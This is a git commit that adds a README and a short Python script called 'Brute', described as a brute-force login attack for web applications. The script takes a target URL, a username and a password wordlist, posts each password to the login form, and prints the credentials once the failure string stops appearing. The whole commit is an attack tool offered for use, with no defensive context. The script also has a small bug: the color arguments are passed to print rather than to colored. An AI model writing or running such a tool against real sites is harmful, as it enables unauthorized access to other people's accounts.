062b56be6719e428b1a3a576a87249139814912d
andr <andreahm@gmx.com>
2022-02-25 03:21:27 -0500

    commit

---
+++ README.md
@@ -0,0 +1,4 @@
+# Brute
+
+Brute is a brute-force login attack for web applications written in python.
+
---
+++ brute.py
@@ -0,0 +1,25 @@
+import requests
+from termcolor import colored
+
+url=input("[+] Enter host: ")
+username=input("[+] Enter username to brute force: ")
+password_file=input("[+] Enter file containing passwords: ")
+login_failed=input("[+] Enter string for failed login: ")
+
+def brute(username,url):
+    for password in passwords:
+        password=password.strip()
+        print(colored("Attempting login with "+password), "red")
+        creds={"username":username,"password":password,"Login":"submit"}
+        response=requests.post(url, data=creds)
+        if login_failed in response.content.decode():
+            pass
+        else:
+            print(colored("[*] Found username: "+username), "green")
+            print(colored("[*] found password: "+password), "green")
+            exit()
+
+with open(password_file, 'r') as passwords:
+    brute(username,url)
+
+print("Password not found")
